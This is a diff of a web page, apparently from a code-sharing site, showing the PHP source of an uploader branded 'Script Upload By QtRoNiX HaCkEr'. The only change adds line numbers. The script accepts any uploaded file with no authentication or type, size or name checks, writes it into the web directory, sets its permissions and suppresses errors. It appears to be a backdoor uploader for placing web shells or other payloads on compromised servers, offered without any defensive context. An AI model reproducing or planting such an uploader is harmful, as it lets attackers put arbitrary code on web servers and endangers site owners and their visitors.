@@ -37,27 +37,27 @@
 
 <h3>Script Upload By QtRoNiX HaCkEr Source Code</h3>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="k">echo</span> <span class="s1">&#39;&amp;lt;center&amp;gt;&amp;lt;font color=&quot;Red&quot; size=&quot;4&quot;&amp;gt;&#39;</span><span class="p">;</span>
-<span class="c1">/// Script Upload By QtRoNiX HaCkEr \\\</span>
-<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])){</span>
-    <span class="nv">$filedir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
-    <span class="nv">$maxfile</span> <span class="o">=</span> <span class="s1">&#39;2000000&#39;</span><span class="p">;</span>
-    <span class="nv">$mode</span> <span class="o">=</span> <span class="s1">&#39;0644&#39;</span><span class="p">;</span>
-    <span class="nv">$userfile_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
-    <span class="nv">$userfile_tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nv">$qx</span> <span class="o">=</span> <span class="nv">$filedir</span><span class="o">.</span><span class="nv">$userfile_name</span><span class="p">;</span>
-        <span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$userfile_tmp</span><span class="p">,</span> <span class="nv">$qx</span><span class="p">);</span>
-        <span class="o">@</span><span class="nb">chmod</span> <span class="p">(</span><span class="nv">$qx</span><span class="p">,</span> <span class="nb">octdec</span><span class="p">(</span><span class="nv">$mode</span><span class="p">));</span>
-<span class="k">echo</span><span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Done ==&amp;gt; </span><span class="si">$userfile_name</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="p">}</span>
-<span class="k">else</span><span class="p">{</span>
-<span class="k">echo</span><span class="s1">&#39;&amp;lt;form method=&quot;POST&quot; action=&quot;#&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;&amp;lt;input type=&quot;file&quot; name=&quot;image&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;Submit&quot; name=&quot;Submit&quot; value=&quot;Upload&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">echo</span> <span class="s1">&#39;&amp;lt;/center&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno"> 1</span> <span class="cp">&lt;?php</span>
+<span class="lineno"> 2</span> <span class="k">echo</span> <span class="s1">&#39;&amp;lt;center&amp;gt;&amp;lt;font color=&quot;Red&quot; size=&quot;4&quot;&amp;gt;&#39;</span><span class="p">;</span>
+<span class="lineno"> 3</span> <span class="c1">/// Script Upload By QtRoNiX HaCkEr \\\</span>
+<span class="lineno"> 4</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])){</span>
+<span class="lineno"> 5</span>  <span class="nv">$filedir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
+<span class="lineno"> 6</span>  <span class="nv">$maxfile</span> <span class="o">=</span> <span class="s1">&#39;2000000&#39;</span><span class="p">;</span>
+<span class="lineno"> 7</span>  <span class="nv">$mode</span> <span class="o">=</span> <span class="s1">&#39;0644&#39;</span><span class="p">;</span>
+<span class="lineno"> 8</span>  <span class="nv">$userfile_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<span class="lineno"> 9</span>  <span class="nv">$userfile_tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+<span class="lineno">10</span>  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">11</span>      <span class="nv">$qx</span> <span class="o">=</span> <span class="nv">$filedir</span><span class="o">.</span><span class="nv">$userfile_name</span><span class="p">;</span>
+<span class="lineno">12</span>      <span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$userfile_tmp</span><span class="p">,</span> <span class="nv">$qx</span><span class="p">);</span>
+<span class="lineno">13</span>      <span class="o">@</span><span class="nb">chmod</span> <span class="p">(</span><span class="nv">$qx</span><span class="p">,</span> <span class="nb">octdec</span><span class="p">(</span><span class="nv">$mode</span><span class="p">));</span>
+<span class="lineno">14</span> <span class="k">echo</span><span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Done ==&amp;gt; </span><span class="si">$userfile_name</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
+<span class="lineno">15</span> <span class="p">}</span>
+<span class="lineno">16</span> <span class="p">}</span>
+<span class="lineno">17</span> <span class="k">else</span><span class="p">{</span>
+<span class="lineno">18</span> <span class="k">echo</span><span class="s1">&#39;&amp;lt;form method=&quot;POST&quot; action=&quot;#&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;&amp;lt;input type=&quot;file&quot; name=&quot;image&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;Submit&quot; name=&quot;Submit&quot; value=&quot;Upload&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
+<span class="lineno">19</span> <span class="p">}</span>
+<span class="lineno">20</span> <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/center&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
+<span class="lineno">21</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
